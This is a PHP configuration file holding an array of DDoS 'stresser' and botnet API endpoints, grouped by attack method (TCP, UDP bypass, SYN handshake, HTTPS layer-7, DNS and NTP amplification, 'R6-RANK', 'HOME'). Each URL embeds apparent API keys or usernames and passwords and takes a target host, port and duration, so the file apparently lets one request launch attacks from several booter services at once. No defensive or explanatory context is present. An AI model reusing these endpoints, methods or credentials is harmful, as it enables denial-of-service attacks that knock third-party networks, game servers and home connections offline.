<?php

$apis_urls = [
    'tcp' => [
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=TCPGOD',
        'http://209.141.43.160:999/api?key=trywarz4544545&host={self.host}&port={self.port}&time={self.time}&method=QUARTZ-TCP',
        'http://108.61.167.195:999/api/attack?username=trywarz&key=trywarz1&host={self.host}&port={self.port}&time=75&method=TCP-VIP&concurrents=1',
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=TCP&concurrents=1',
        'https://silence-network.net/apis.php?key=gqgYpijJUpA6ygmhKlgZb02uzjibP6H0&username=root&host={self.host}&port={self.port}&time={self.time}&method=TCP-NUKE',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=TCP',
    ],
    'ovh' => [
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=OVHTCP',
        'http://209.141.43.160:999/api?key=trywarz4544545&host={self.host}&port={self.port}&time={self.time}&method=QUARTZ-OVH',
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=OVH&concurrents=1',
        'http://108.61.167.195:999/api/attack?username=trywarz&key=trywarz1&host={self.host}&port={self.port}&time=75&method=OVH-VIP&concurrents=1',
        'https://silence-network.net/apis.php?key=gqgYpijJUpA6ygmhKlgZb02uzjibP6H0&username=root&host={self.host}&port={self.port}&time={self.time}&method=OVH-NUKE',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=OVH-TCP',

    ],
    'ack' => [
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=ACK',
        'http://209.141.43.160:999/api?key=trywarz4544545&host={self.host}&port={self.port}&time={self.time}&method=QUARTZ-SOCKET',
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=ACK-RAW&concurrents=1',
        'https://silence-network.net/apis.php?key=gqgYpijJUpA6ygmhKlgZb02uzjibP6H0&username=root&host={self.host}&port={self.port}&time={self.time}&method=ACK',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=SOCKET',
    ],
    'handshake' => [
        'http://37.139.129.55:1337/botnet/api?key=screamc2&host={self.host}&port={self.port}&time={self.time}&method=SYN',
        'https://funnel.herios-stresser.space/api?key=screamc249656555&host={self.host}&port={self.port}&time={self.time}&method=syn-raw',
        'https://silence-network.net/api?token=MoTxKYXatO93KcrVQqS9zN&host={self.host}&port={self.port}&time={self.time}&method=HANDSHAKE',
        'https://api.vacstresser.ru/api?key=oKoJ6sqmzvwTsROd&host={self.host}&port={self.port}&time={self.time}&method=HANDSHAKE',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=HANDSHAKE',

    ],
    'udpplain' => [
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=UDPBYPASS',
        'http://209.141.43.160:999/api?key=trywarz4544545&host={self.host}&port={self.port}&time={self.time}&method=QUARTZ-UDP',
        'http://108.61.167.195:999/api/attack?username=trywarz&key=trywarz1&host={self.host}&port={self.port}&time=75&method=UDP-VIP&concurrents=1',
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=UDP-VIP&concurrents=1',
        'https://silence-network.net/apis.php?key=gqgYpijJUpA6ygmhKlgZb02uzjibP6H0&username=root&host={self.host}&port={self.port}&time={self.time}&method=UDP-NUKE',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=UDPPLAIN',
    ],
    'https' => [
        'http://209.141.43.160:999/api?key=trywarz4544545&host={self.host}&port={self.port}&time={self.time}&method=L7-BYPASS',
        'http://108.61.167.195:999/api/attack?username=trywarz&key=trywarz1&host={self.host}&port={self.port}&time=75&method=TLS-VIP&concurrents=1',
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=HTTPS-VIP&concurrents=1',
        'https://silence-network.net/apis.php?key=gqgYpijJUpA6ygmhKlgZb02uzjibP6H0&username=root&host={self.host}&port={self.port}&time={self.time}&method=HTTPS-NUKE',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=messi-l7',

    ],
    'mixamp' => [
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=DNS&concurrents=1',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=MIXAMP',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=MIXAMP',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=MIXAMP',

    ],

    'NFO' => [
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=NFO&concurrents=1',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=TFO',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=TFO',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=NFO',

    ],

    'HOME' => [
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=NTP',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=NTP',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=UDPPLAIN',

    ],

    'R6-RANK' => [
        'http://141.98.6.219:999/api/attack?username=trywarz&key=trywarz&host={self.host}&port={self.port}&time={self.time}&method=DNS&concurrents=1',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=MIXAMP',
        'https://api.vacstresser.ru/api?key=4973e5b3-fc05-4d15-afa1-7da54e5d1d09&host={self.host}&port={self.port}&time={self.time}&method=MIXAMP',
        'https://denbots.lat/api/attack?username=silencetry&secret=try@sile32&host={self.host}&port={self.port}&time={self.time}&method=MIXAMP',

    ],

    
];